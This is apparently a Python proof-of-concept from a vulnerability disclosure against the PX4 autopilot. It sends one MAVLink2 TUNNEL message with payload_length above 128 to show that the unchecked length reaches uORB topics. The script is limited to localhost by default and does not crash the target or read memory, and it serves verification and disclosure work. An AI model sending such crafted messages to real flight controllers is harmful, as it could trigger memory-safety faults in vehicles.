#!/usr/bin/env python3
"""PX4 MAVLink TUNNEL payload_length unchecked propagation (verification PoC).

This PoC is for *verification* of the unsafe length propagation described in the
internal reports (case 08/14). It demonstrates that PX4 publishes a uORB sample
where:
- payload_length can be set > 128 by an unauthenticated MAVLink sender
- only 128 bytes of payload are carried in the buffer

Safety:
- Localhost only by default.
- Sends a single TUNNEL message.
- Does not attempt to crash PX4 or exfiltrate memory.

Evidence collection:
- Run px4-listener on either `mavlink_tunnel` (payload_type != 211) or
  `esc_serial_passthru` (payload_type == 211) to observe payload_length.

"""

from __future__ import annotations

import argparse

from pymavlink.dialects.v20 import common as mav2

from disclosure._shared.mavlink_poc_common import UdpEndpoint, MavUdpClient, build_arg_parser


def main() -> int:
    ap = build_arg_parser("Verify TUNNEL payload_length propagation to uORB")
    ap.add_argument("--target-system", type=int, default=1)
    ap.add_argument("--target-component", type=int, default=1)
    ap.add_argument(
        "--payload-type",
        type=int,
        default=0,
        help="TUNNEL payload_type (0 publishes to mavlink_tunnel; 211 publishes to esc_serial_passthru)",
    )
    ap.add_argument("--payload-length", type=int, default=200, help=">128 to model unsafe propagation")
    ap.add_argument("--fill-byte", type=lambda s: int(s, 0), default=0x41)
    args = ap.parse_args()

    c = MavUdpClient(
        bind=UdpEndpoint(args.bind_host, args.bind_port),
        target=UdpEndpoint(args.target_host, args.target_port),
        sysid=args.sysid,
        compid=args.compid,
    )

    # Minimal partner binding hint
    c.send_heartbeat()

    payload = [args.fill_byte & 0xFF] * 128

    msg = mav2.MAVLink_tunnel_message(
        target_system=args.target_system,
        target_component=args.target_component,
        payload_type=int(args.payload_type) & 0xFFFF,
        payload_length=int(args.payload_length) & 0xFF,
        payload=payload,
    )

    c.send(msg)

    print("SENT: MAVLink2 TUNNEL")
    print(f"  target=udp:{args.target_host}:{args.target_port} from bind={args.bind_host}:{args.bind_port}")
    print(f"  payload_type={int(args.payload_type)}")
    print(f"  payload_length={int(args.payload_length)} (uORB payload buffer is 128 bytes)")
    print("NEXT (evidence):")
    if int(args.payload_type) == 211:
        print("  run: px4-listener esc_serial_passthru -n 1")
    else:
        print("  run: px4-listener mavlink_tunnel -n 1")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
